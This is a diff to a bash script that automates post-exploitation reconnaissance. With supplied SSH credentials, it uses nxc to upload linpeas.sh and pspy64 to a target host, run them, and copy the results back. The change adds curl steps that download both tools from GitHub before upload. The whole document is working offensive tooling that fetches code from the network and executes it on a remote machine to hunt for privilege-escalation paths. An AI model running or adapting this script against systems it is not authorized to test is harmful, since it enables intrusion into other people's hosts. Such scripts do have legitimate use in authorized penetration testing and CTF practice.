@@ -7,7 +7,7 @@ TARGET="$1"
 USER="$2"
 PASS="$3"
 
-STEPS=6
+STEPS=8
 
 percent() {
   echo $(( ($1 * 100) / $STEPS ))
@@ -17,27 +17,36 @@ step() {
   echo "[${1}/${STEPS}] ($(percent $1)%): $2"
 }
 
-if [[ ! -f linpeas.sh || ! -f pspy64 ]]; then
-    echo "[!] linpeas.sh or pspy64 missing from current directory!"
-    exit 1
-fi
+set -e
 
-step 1 "Uploading linpeas.sh"
+# Define latest release URLs
+LINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+PSPY_URL="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
+
+step 1 "Downloading latest linpeas.sh"
+curl -sSL "$LINPEAS_URL" -o linpeas.sh
+chmod +x linpeas.sh
+
+step 2 "Downloading latest pspy64"
+curl -sSL "$PSPY_URL" -o pspy64
+chmod +x pspy64
+
+step 3 "Uploading linpeas.sh"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file linpeas.sh /tmp/linpeas.sh > /dev/null 2>&1
 
-step 2 "Running linpeas.sh"
+step 4 "Running linpeas.sh"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh | tee /tmp/linpeas.out" > /dev/null 2>&1
 
-step 3 "Downloading linpeas output"
+step 5 "Downloading linpeas output"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" --get-file /tmp/linpeas.out "./${TARGET}_linpeas.out" > /dev/null 2>&1
 
-step 4 "Uploading pspy64"
+step 6 "Uploading pspy64"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" --put-file pspy64 /tmp/pspy64 > /dev/null 2>&1
 
-step 5 "Running pspy64 for 60 seconds"
+step 7 "Running pspy64 for 60 seconds"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" -x "chmod +x /tmp/pspy64 && timeout 60 /tmp/pspy64 > /tmp/pspy.out" > /dev/null 2>&1
 
-step 6 "Downloading pspy output"
+step 8 "Downloading pspy output"
 nxc ssh "$TARGET" -u "$USER" -p "$PASS" --get-file /tmp/pspy.out "./${TARGET}_pspy.out" > /dev/null 2>&1
 
 echo "[+] 100% Complete! Results saved as ${TARGET}_linpeas.out and ${TARGET}_pspy.out"
